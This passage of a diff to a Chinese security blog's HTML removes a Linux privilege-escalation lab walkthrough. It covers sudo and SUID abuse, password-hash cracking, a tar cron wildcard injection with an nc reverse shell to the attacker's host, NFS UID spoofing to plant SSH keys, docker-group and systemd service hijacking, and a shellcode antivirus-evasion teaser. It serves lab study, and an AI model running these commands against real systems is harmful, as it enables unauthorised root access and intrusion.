class="line">[讲XKBLAYOUT改的值为us]</span><br><span class="line">setupcon</span><br><span class="line">2.配置网卡[Ubuntu 18通过netplan设置网络]</span><br><span class="line">vim /etc/netplan/50-cloud-init.yaml</span><br><span class="line">[将enp0s3改为ens33]</span><br><span class="line">netplan apply</span><br></pre></td></tr></table></figure>
-
-<p>网卡配置的时候记得把ens33往前面移动一点点</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325104232243.png" alt="image-20220325104232243"></p>
-<h2 id="Sudo提权"><a href="#Sudo提权" class="headerlink" title="Sudo提权"></a>Sudo提权</h2><p>Sudo权限本意是root把本来只能超级用户执行的命令赋予普通用户执行。</p>
-<p>Sudo提权其实是因为管理员平时为了方便，给/etc/sudoers文件配hi不当，从而导致了权限提升的问题。</p>
-<p>当你自己是一个普通用户的时候，可以通过命令<code>sudo-l</code>来查看自己可以执行哪些sudo命令</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105414439.png" alt="image-20220325105414439"></p>
-<p>可以发现这里，我们有多种命令都被赋予了sudo权限。</p>
-<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/ash/#sudo">ash | GTFOBins</a>这个网站可以让我们查阅通过sudo权限如何调用命令获得root权限。比如我们查阅ash</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105749744.png" alt="image-20220325105749744"></p>
-<p>在靶机中键入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ash</span><br></pre></td></tr></table></figure>
-
-<p>即可成功提权</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105839939.png" alt="image-20220325105839939"></p>
-<h2 id="etc-passwd哈希"><a href="#etc-passwd哈希" class="headerlink" title="etc/passwd哈希"></a>etc/passwd哈希</h2><p>liunx的用户密码哈希存储在/etc/shadow文件，普通用户能够看到的是/etc/passwd这个文件。在/etc/passwd中，我们会发现如下形式。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325110314338.png" alt="image-20220325110314338"></p>
-<p>比如<code>root:x:0:0:root:/root:/bin/bash</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.用户名</span><br><span class="line">2.密码，x表示密码保存在/etc/shadow</span><br><span class="line">3.UID，0代表root</span><br><span class="line">4.GID，表示所在组</span><br><span class="line">5.描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other</span><br><span class="line">6.用户主目录</span><br><span class="line">7.默认shell类型</span><br></pre></td></tr></table></figure>
-
-<p>账户的第二列是密码hash，如果该列为x则代表密码哈希存储在/etc/shadow文件上。</p>
-<p>这里我们发现账户insecurity是超级账户（uid，gid为0）并且密码存储在了passwd文件上，借此可以拷贝下来解密</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111759093.png" alt="image-20220325111759093"></p>
-<p>切换用户即可提权成功。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111911455.png" alt="image-20220325111911455"></p>
-<h2 id="etc-shadow哈希"><a href="#etc-shadow哈希" class="headerlink" title="etc/shadow哈希"></a>etc/shadow哈希</h2><p>而/etc/shadow默认只能是root用户权限才能查看。它保存的是加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号<code>:</code>分为9个部分</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111015896.png" alt="image-20220325111015896"></p>
-<p>为什么我们这里能以bob权限看到shadow呢，因为在刚才的sudo提取中，我们看到man命令也是赋予了sudo权限的，所以可以借此看到shadow文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.用户名</span><br><span class="line">2.加密后的密码</span><br><span class="line">3.上次修改密码的时间(从1970.1.1开始的总天数)</span><br><span class="line">4.两次修改密码间隔的最少天数，如果为0，则没有限制</span><br><span class="line">5.两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制</span><br><span class="line">6.提前多少天警告用户密码将过期</span><br><span class="line">7.在密码过期之后多少天禁用此用户</span><br><span class="line">8.用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用</span><br><span class="line">9.保留</span><br><span class="line">#由示例可知，加密的密码具有固定格式：</span><br><span class="line">$id$salt$encrypted</span><br><span class="line">id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512</span><br><span class="line">salt为盐值,系统随机生成</span><br><span class="line">encrypted表示密码的hash值</span><br></pre></td></tr></table></figure>
-
-<p>由此也可以通过解密hash值，来得到密码。</p>
-<h2 id="crontab定时任务"><a href="#crontab定时任务" class="headerlink" title="crontab定时任务"></a>crontab定时任务</h2><p>corntab文件格式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* * * * * command</span><br><span class="line">分 时 日 月 周 命令</span><br><span class="line">第1列表示分钟1～59 每分钟用*或者 */1表示</span><br><span class="line">第2列表示小时1～23（0表示0点）</span><br><span class="line">第3列表示日期1～31</span><br><span class="line">第4列表示月份1～12</span><br><span class="line">第5列标识号星期0～6（0表示星期天）</span><br><span class="line">第6列要运行的命令</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113416094.png" alt="image-20220325113416094"></p>
-<p>查看<code>corn.daily</code>权限</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113621004.png" alt="image-20220325113621004"></p>
-<p>发现这个定时任务的执行权限是root。接下来查看其内容</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113743063.png" alt="image-20220325113743063"></p>
-<p>知道它是把用户/home目录下的文件使用<code>tar</code>打包备份到<code>/etc/backups</code>下。</p>
-<p>这里涉及到了利用通配符使用tar进行命令注入。</p>
-<p>先在我们自己的kali机器上生成一个nc的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.137.133 lport=4444</span><br></pre></td></tr></table></figure>
-
-<p>在受害机器上的bob目录下，注入一个标志来指定我们的检查点.</p>
-<p><code>--checkpoint是指每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作。</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">–checkpoint-action=ACTION 在每个checkpoint（检查点）上执行ACTION</span><br></pre></td></tr></table></figure>
-
-<p>将payload写入一个sh文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;mkfifo /tmp/vtqm; nc 192.168.137.133 4444 0&lt;/tmp/vtqm | /bin/sh &gt;/tmp/vtqm 2&gt;&amp;1; rm /tmp/vtqm&quot; &gt; shell.sh</span><br></pre></td></tr></table></figure>
-
-<p>注入一个指定检查点动作的标志</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br></pre></td></tr></table></figure>
-
-<p><code>–checkpoint-action=ACTION</code> 在每个checkpoint（检查点）上执行ACTION</p>
-<p>为什么这个提权能成功呢？因为我们相当于用到了tar命令的<code>--checkpoint</code>与<code>--checkpoint-action</code>参数，让他在打包文件时执行了我们的命令。就反弹了shell。</p>
-<h2 id="敏感隐藏文件"><a href="#敏感隐藏文件" class="headerlink" title="敏感隐藏文件"></a>敏感隐藏文件</h2><p>有时候隐藏文件可能会存放一些重要信息，比如我们搜索home目录下的所有隐藏文件，并用ls -al来显示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;.*&quot; -type f -path &quot;/home/*&quot; -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>该命令是查找所有隐藏文件。并将无法访问的文件错误信息导入到/dev/null中。这样就会很清楚的只看到可以回显可以查看的文件。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325115808687.png" alt="image-20220325115808687"></p>
-<p>发现susan目录下的秘密文件.secret。查看可以知道密码</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325115851286.png" alt="image-20220325115851286"></p>
-<h2 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a>Suid提权</h2><p>Suid这个是uid+s的组合，s指的是特殊权限。一般情况下，用户的权限是3位，比如0755这样的，特殊权限默认没有配置，但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有root权限，就会配置特殊权限</p>
-<p>比如说passwd这个命令，这个命令会修改/etc/shadow文件，而/etc/shadow只有root才能修改，本来passwd这个命令应该也只能root才能执行。但是系统为了让普通用户能够修改自己的密码，对passwd这个命令赋予了特殊权限并添加了只能修改自己密码的限制。</p>
-<p>使用find命令快速查找所有suid文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm 4000 -type f -exec ls -al &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>
-
-<h3 id="xxd提权"><a href="#xxd提权" class="headerlink" title="xxd提权"></a>xxd提权</h3><p>发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-x--- 1 root itservices 18552 Apr 10 2018 /usr/bin/xxd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325161742759.png" alt="image-20220325161742759"></p>
-<p>而组itservices具有执行权限，通过/etc/group发现susan用户属于Itservices用户组。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162035632.png" alt="image-20220325162035632"></p>
-<p>接下来可以通过刚才发现的敏感文件，切换到susan用户。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162858779.png" alt="image-20220325162858779"></p>
-<p>仍然可以使用上篇发现的网站用来查询在xxd有suid的情况下可以提权的命令。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162945722.png" alt="image-20220325162945722"></p>
-<p>这里的<code>LFILE</code>是在命令行中定义的变量，它被用于定义需要查看的文件。这里我们以<code>/etc/shadow</code>作为示例。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163139641.png" alt="image-20220325163139641"></p>
-<h3 id="taskset"><a href="#taskset" class="headerlink" title="taskset"></a>taskset</h3><p>除了xxd之外，在之前还有文件叫taskset也能用来提权。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163502734.png" alt="image-20220325163502734"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163523182.png" alt="image-20220325163523182"></p>
-<h2 id="第三方服务访问"><a href="#第三方服务访问" class="headerlink" title="第三方服务访问"></a>第三方服务访问</h2><h3 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h3><p>什么是NFS？</p>
-<p>网络文件系统(NFS)是一个客户端/服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在NFS协议是几个分布式文件系统标准，网络附加存储(NAS)之一。</p>
-<p>我们用kali可以搜索到被害机器上开放着nfs服务。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325164716494.png" alt="image-20220325164716494"></p>
-<p>使用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.137.144</span><br></pre></td></tr></table></figure>
-
-<p>可以查看远程nfs服务器上的共享目录。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325164813507.png" alt="image-20220325164813507"></p>
-<p>在kali机器上挂在远程目录</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325170408111.png" alt="image-20220325170408111"></p>
-<p>一般来说，可以把挂载出来的目录立即尝试添加authorized_key文件，从而实现ssh免密码登录，但是这里创造文件是不允许的，因为提示权限不够。即使我们在kali机器上是root权限，但是我们还是没有写入权限，这是因为默认情况下客户端的root身份会被分配成用户<code>nfsnobody</code>。</p>
-<p>解决方法是在kali上创建同靶机系统相同UID且相同用户名的账户，用其来写入文件。(即伪造文件所有者的UID和GID来欺骗nfs服务器。)</p>
-<p>在被害机器中我们可以知道peter账户的uid为1001，gid为1005.</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325171318385.png" alt="image-20220325171318385"></p>
-<p>在kali机器中创建相同账户。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd -g 1005 peter</span><br><span class="line">adduser peter -uid 1001 -gid 1005</span><br></pre></td></tr></table></figure>
-
-<p>切换到peter账户，可以在该目录下写文件了。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325171521879.png" alt="image-20220325171521879"></p>
-<p>写入ssh公钥</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#[攻击机]ssh-keygen生成公私钥对</span><br><span class="line">ssg-keygen</span><br><span class="line">#创建.ssh目录</span><br><span class="line">peter@kali:/mnt/peter$ mkdir .ssh</span><br><span class="line">#传输public key</span><br><span class="line">peter@kali:/mnt/peter$ cat ~/.ssh/id_rsa.pub &gt; /mnt/peter/.ssh/authorized_keys</span><br><span class="line">#设置权限</span><br><span class="line">peter@kali:/mnt/peter/.ssh$ chmod 700 ../.ssh/</span><br><span class="line">peter@kali:/mnt/peter/.ssh$ chmod 600 authorized_keys</span><br><span class="line">#使用私钥登录</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325172400774.png" alt="image-20220325172400774"></p>
-<h2 id="docker组提权"><a href="#docker组提权" class="headerlink" title="docker组提权"></a>docker组提权</h2><p>peter用户属于docker组，docker组的成员，可以根据此漏洞来获取root的shell</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325190543341.png" alt="image-20220325190543341"></p>
-<p><a target="_blank" rel="noopener" href="https://fosterelli.co/privilege-escalation-via-docker.html">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325190947875.png" alt="image-20220325190947875"></p>
-<h2 id="systemd配置提权"><a href="#systemd配置提权" class="headerlink" title="systemd配置提权"></a>systemd配置提权</h2><h3 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h3><p>历史上，Linux的启动一直采用init进程。</p>
-<p>下面的命令用来启动服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">sudo /etc/init.d/apache2 start</span><br></pre></td></tr></table></figure>
-
-<p>这种方法有两个缺点。</p>
-<p>1.启动时间长。init进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</p>
-<p>2.启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使脚本变得很长。</p>
-<p>systemd就是为了解决这些问题而诞生的。它的设计目标是，为系统的启动和管理提供一套完整的解决方案。使用了Systemd，就不需要再用init了。Systemd取代了init，成为了系统的第一个进行（pid等于1），其他进程都是它的子进程。Systemd并不是一个命令，而是一组命令，涉及到系统管理的方方面面。</p>
-<p>systemctl是systemd的主命令，用于管理系统。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 重启系统</span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"># 关闭系统，切断电源</span><br><span class="line">$ sudo systemctl poweroff systemd-analyze命令用于查看启动耗时。</span><br><span class="line"># 查看启动耗时</span><br><span class="line">$ systemd-analyze</span><br><span class="line"># 查看每个服务的启动耗时</span><br><span class="line">$ systemd-analyze blame</span><br><span class="line"># hostnamectl命令用于查看当前主机的信息。</span><br><span class="line"># 显示当前主机的信息</span><br><span class="line">$ hostnamectl</span><br><span class="line"># 设置主机名</span><br><span class="line">$ sudo hostnamectl set-hostname rhel7</span><br></pre></td></tr></table></figure>
-
-<h3 id="systemd提权"><a href="#systemd提权" class="headerlink" title="systemd提权"></a>systemd提权</h3><p>查看peter用户的systemd配置，发现peter这个用户拥有debug.service文件，并且他对这个文件具有读和写的权限。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325191943553.png" alt="image-20220325191943553"></p>
-<p>如果服务器存在缺陷，可以被覆盖或者修改文件，可以通过修改低权限用户有权访问的.service文件并更改run()命令来将其转换为代码执行。重新启动服务时，将运行攻击者的命令。</p>
-<p>查看debug.service文件，这里我们可以修改<code>Execstart</code>行，除此之外还可以修改<code>ExecStop</code>和<code>ExecReload</code>来自启动和重启服务时执行命令</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325192434111.png" alt="image-20220325192434111"></p>
-<p><code>/root/debug</code>这是一个二进制服务并且该服务以root身份运行。</p>
-<p>使用一个类似ssh可以sudo执行的方法。让root身份来创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755</span><br><span class="line">/home/peter/systemdbash&#x27; &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</span><br></pre></td></tr></table></figure>
-
-<p>该命令的意思是将bash复制到<code>/home/peter/systemdbash</code>下，并赋予权限，便于到时候我们可以直接执行SUID提权。</p>
-<p>之后更改<code>debug.service</code>下的<code>Execstart</code>行为<code>/home/peter/systemdexpl.sh</code></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325193614818.png" alt="image-20220325193614818"></p>
-<p>接下来就可以利用suid提权</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325194131842.png" alt="image-20220325194131842"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">靶机渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-shellcode基础与简单调用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/">shellcode的基础免杀</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2022-03-21T08:20:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="shellcode基础"><a href="#shellcode基础" class="headerlink" title="shellcode基础"></a>shellcode基础</h1><h2 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a>什么是shellcode</h2><p>shellcode是一段由16进制组成的机器码，因为经常可以让攻击者受到被害机器的shell而得名(但现在shellcode功能更多样，比如添加用户或者执行特殊命令，特殊进程等但是都被统称为shellcode)，其特点是在于它可以无文件落地，直接在内存中运行，以至于一般杀毒软件无法查杀到。一般来说，shellcode会在目标机器上建立一个新的shell进程，然后同攻击者进行通信，接受攻击者的指令，然后返回结果。那么如何建立一个shell进程呢？在Unix中使用execve命令可以建立，而在windows下需要调用内核API来建立。</p>
-<h2 id="shellcode的方向"><a href="#shellcode的方向" class="headerlink" title="shellcode的方向"></a>shellcode的方向</h2><p>shellcode一般分为正向和反向。在msf中，我们经常会发现一个payload有reverse的前缀（表示为反向）它们的原理如下:</p>
-        
-          <a class="article-more-a" href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/5/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -1092,8 +505,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
